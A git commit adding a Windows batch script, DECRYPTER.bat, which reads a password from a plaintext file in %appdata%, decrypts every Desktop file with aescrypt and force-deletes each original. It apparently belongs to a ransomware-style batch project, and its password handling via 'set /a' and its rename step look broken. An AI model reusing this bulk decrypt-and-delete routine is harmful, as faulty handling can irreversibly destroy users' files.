ab40442751c278e54aa8a2d6ebb953d824465141
BAtchfiler0 <79028261+BAtchfiler0@users.noreply.github.com>
2023-11-07 19:54:36 +0900

    Add files via upload

---
+++ DECRYPTER.bat
@@ -0,0 +1,13 @@
+@echo off
+cd "%appdata%"
+for /f "tokens=*" %%A in ('type password.txt') do (
+set /a pass = %%A
+)
+cd "%userprofile%\desktop"
+
+For /f "tokens=*" %%A in ('dir /b /s /a-d-h') do (
+C:\aescrypt -d -p %pass% "%%~A"
+ren "%%~nA.b" "*."
+del /f /q "%%~A"
+)
+pause
